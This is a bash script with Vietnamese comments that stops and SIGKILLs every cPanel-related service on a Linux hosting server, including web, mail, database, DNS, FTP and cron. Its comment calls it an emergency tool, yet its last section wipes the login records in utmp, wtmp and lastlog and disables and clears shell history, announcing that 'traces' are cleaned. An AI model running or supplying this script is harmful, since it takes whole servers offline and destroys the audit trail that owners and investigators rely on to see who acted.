#!/bin/bash
# Cpanel Full Killer Script
# Dừng tất cả dịch vụ và kill toàn bộ tiến trình liên quan đến cPanel.
# Hỗ trợ: CentOS 6/7/8/9, AlmaLinux, Rocky, CloudLinux.
# Cảnh báo: SIGKILL (-9) không cho tiến trình dọn dẹp. Chỉ dùng khi cần dừng khẩn cấp.

set -e

echo "[+] Detecting init system..."
stop_service() {
    local svc="$1"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$svc" 2>/dev/null || true
    else
        service "$svc" stop 2>/dev/null || true
    fi
}

echo "[+] Stopping known cPanel services via init..."
SERVICES=(
    cpanel cpsrvd httpd apache2 nginx mysql mysqld mariadb
    exim dovecot courier-imap pure-ftpd named bind spamassassin crond
    chkservd tailwatchd cpdavd
)
for svc in "${SERVICES[@]}"; do
    stop_service "$svc"
done

echo "[+] Stopping internal cPanel services via restartsrv scripts..."
if [ -d /usr/local/cpanel/scripts ]; then
    for f in /usr/local/cpanel/scripts/restartsrv_*; do
        [ -f "$f" ] || continue
        "$f" --stop 2>/dev/null || true
    done
fi

echo "[+] Killing ALL remaining cPanel processes (aggressive)..."
pkill -9 -u cpanel                    2>/dev/null || true
pkill -9 -f '/usr/local/cpanel'       2>/dev/null || true
pkill -9 -f cpsrvd                    2>/dev/null || true
pkill -9 -f cpanel                    2>/dev/null || true
pkill -9 -f chkservd                  2>/dev/null || true
pkill -9 -f tailwatchd                2>/dev/null || true
pkill -9 -f cpdavd                    2>/dev/null || true
pkill -9 httpd                        2>/dev/null || true
pkill -9 apache2                      2>/dev/null || true
pkill -9 nginx                        2>/dev/null || true
pkill -9 exim                         2>/dev/null || true
pkill -9 dovecot                      2>/dev/null || true
pkill -9 pure-ftpd                   2>/dev/null || true
pkill -9 named                        2>/dev/null || true
pkill -9 mysqld                       2>/dev/null || true
pkill -9 mariadb                      2>/dev/null || true

echo "[+] Cleaning login logs and bash history..."
: > /var/run/utmp
: > /var/log/wtmp
: > /var/log/lastlog
export HISTSIZE=0
history -c 2>/dev/null || true
source /root/.bashrc 2>/dev/null || true

echo "[✓] All cPanel processes killed and traces cleaned."
